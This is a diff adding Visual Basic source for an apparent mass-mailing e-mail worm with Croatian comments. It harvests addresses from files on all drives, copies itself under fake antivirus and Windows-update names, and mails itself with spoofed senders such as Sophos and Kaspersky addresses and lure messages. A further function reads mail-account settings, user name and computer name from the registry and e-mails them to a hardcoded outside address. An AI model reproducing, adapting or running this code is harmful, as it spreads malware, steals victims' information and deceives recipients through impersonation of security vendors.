@@ -1,0 +1,157 @@
+
+
+
+
+Option Explicit
+Dim Fso, DrvType
+Dim Drives, Drive, Folder, Files, File, SrchExten, SourceCode, AllSourceCode, TxtLen
+Dim MailVictim, TxtCnt, SubFolders, SubFolder
+Dim CdoMail, LineName, CharName, s, i, Win, Mailss, disk, wsc
+Dim ssmtp, sname, smail, sserv, compn, usnam
+'ovo sve ispod je potrebno za mail sirenje (necu opisivati)
+Public Function Mail()
+On Error Resume Next
+Set Fso = CreateObject("Scripting.FileSystemObject")
+If (Fso.DriveExists("C:\")) <> "" Then
+DrvType = "C:\"
+End If
+
+Set Drives = Fso.Drives
+For Each Drive In Drives
+If Drive.DriveType = 2 Or Drive.DriveType = 3 Then
+DoSearchIn (Drive)
+End If
+Next
+End Function
+Function DoSearchIn(Path)
+On Error Resume Next
+Set Fso = CreateObject("Scripting.FileSystemObject")
+Set Folder = Fso.GetFolder(Path)
+Set Files = Folder.Files
+For Each File In Files
+
+SrchExten = Fso.GetExtensionName(File.Path)
+SrchExten = LCase(SrchExten)
+If (SrchExten = "htt") Or (SrchExten = "htm") Or (SrchExten = "html") _
+Or (SrchExten = "hta") Or (SrchExten = "hte") Or (SrchExten = "htx") _
+Or (SrchExten = "shtml") Or (SrchExten = "stm") Or (SrchExten = "asp") _
+Or (SrchExten = "xml") Or (SrchExten = "doc") Or (SrchExten = "rtf") _
+Or (SrchExten = "txt") Or (SrchExten = "dbx") Or (SrchExten = "php") _
+Or (SrchExten = "php3") Or (SrchExten = "phtml") Or (SrchExten = "jsp") _
+Or (SrchExten = "sql") Or (SrchExten = "eml") Or (SrchExten = "ini") _
+Or (SrchExten = "tbb") Or (SrchExten = "tbi") Then
+
+Set SourceCode = Fso.OpenTextFile(File.Path, 1)
+AllSourceCode = SourceCode.ReadAll
+SourceCode.Close
+For TxtLen = 1 To Len(AllSourceCode)
+If Mid(AllSourceCode, TxtLen, 7) = "mailto:" Then
+MailVictim = ""
+TxtCnt = 0
+Do While Mid(AllSourceCode, TxtLen + 7 + TxtCnt, 1) <> """"
+MailVictim = MailVictim + Mid(AllSourceCode, TxtLen + 7 + TxtCnt, 1)
+TxtCnt = TxtCnt + 1
+Loop
+
+EmailTo (File.Path)
+End If
+Next
+SourceCode = ""
+AllSourceCode = ""
+MailVictim = ""
+End If
+Next
+Set SubFolders = Folder.SubFolders
+For Each SubFolder In SubFolders
+DoSearchIn (SubFolder.Path)
+Next
+End Function
+Function EmailTo(MailTo) 'slanje mailova (s crvom)
+On Error Resume Next
+Win = Environ("WinDir") & "\"
+MkDir Win & "\Mails"
+Mailss = Win & "Mails"
+FileCopy App.Path + "\" + App.EXEName + ".exe", Mailss & "\SP2.exe"
+FileCopy App.Path + "\" + App.EXEName + ".exe", Mailss & "\Save_Me.exe"
+FileCopy App.Path + "\" + App.EXEName + ".exe", Mailss & "\Sophos_3.89.exe"
+FileCopy App.Path + "\" + App.EXEName + ".exe", Mailss & "\NOD32_Fix.exe"
+FileCopy App.Path + "\" + App.EXEName + ".exe", Mailss & "\Kaspersky_Lab.exe"
+
+If s = 0 Then
+Dim eml_from(1 To 5) As String
+eml_from(1) = "anna_mitchel@gmail.com"
+eml_from(2) = "david.finley@hotmail.com"
+eml_from(3) = "marc.grant@sophos.com"
+eml_from(4) = "sample@nod32.com"
+eml_from(5) = "dimitry@kaspersky.com"
+
+Dim eml_body(1 To 5) As String
+eml_body(1) = "Microsoft have relase SP2, run the attechment and it will download SP2 To you"
+eml_body(2) = "Save the file on your disk!"
+eml_body(3) = "I send to you the test Sophos AV."
+eml_body(4) = "In the attechment we send you the new version of NOD32 Patch"
+eml_body(5) = "If you have (or if you think) that you have on your PC undetected virus/worm then run the progi in the attechment."
+
+Dim eml_subject(1 To 5) As String
+eml_subject(1) = "Microsofts SP2"
+eml_subject(2) = "Save"
+eml_subject(3) = "Test The New Sophos Anti-Virus"
+eml_subject(4) = "Bug Fix For NOD32"
+eml_subject(5) = "New worms"
+
+Dim eml_atte(1 To 5) As String
+eml_atte(1) = Mailss & "\SP2.exe"
+eml_atte(2) = Mailss & "\Save_Me.exe"
+eml_atte(3) = Mailss & "\Sophos_3.89.exe"
+eml_atte(4) = Mailss & "\NOD32_Fix.exe"
+eml_atte(5) = Mailss & "\Kaspersky_Lab.exe"
+
+Randomize Timer
+i = (1 + Rnd * 5)
+Set CdoMail = CreateObject("CDO.Message")
+With CdoMail
+.To = MailVictim
+.From = eml_from(i)
+.Subject = eml_subject(i)
+.HTMLBody = eml_body(i)
+.AddAttachment (eml_atte(i))
+.Send
+End With
+Set CdoMail = Nothing
+End If
+End Function
+Function Info() 'slanje informacija o zrtvi na moj mail
+On Error Resume Next
+Win = Environ("WinDir") & "\"
+disk = Mid$(Win, 1, 3) & ""
+Set wsc = CreateObject("WScript.Shell")
+For i = 1 To 9
+ssmtp = wsc.RegRead("HKCU\Software\Microsoft\Internet Account Manager\Accounts\0000000" & i & "\SMTP Server")
+sname = wsc.RegRead("HKCU\Software\Microsoft\Internet Account Manager\Accounts\0000000" & i & "\SMTP Display Name")
+smail = wsc.RegRead("HKCU\Software\Microsoft\Internet Account Manager\Accounts\0000000" & i & "\SMTP Email Address")
+sserv = wsc.RegRead("HKCU\Software\Microsoft\Internet Account Manager\Accounts\0000000" & i & "\POP3 Server")
+Next i
+usnam = wsc.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Logon User Name")
+compn = wsc.RegRead("HKLM\System\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
+Open disk & "info.txt" For Output As 1
+Print #1, "User name: " & usnam
+Print #1, "Copmuter name: " & compn
+Print #1, "POP3 Server: " & sserv
+Print #1, "SMTP Server: " & ssmtp
+Print #1, "SMTP Name: " & sname
+Print #1, "SMTP Email Address: " & smail
+Print #1, "Time: " & Time$
+Print #1, "Date: " & Date$
+Close
+
+Set CdoMail = CreateObject("CDO.Message")
+With CdoMail
+.To = "vrkljan@gmail.com"
+.From = "victim@victim.com"
+.Subject = "Victim"
+.HTMLBody = "Info"
+.AddAttachment (disk & "info.txt")
+.Send
+End With
+Set CdoMail = Nothing
+End Function
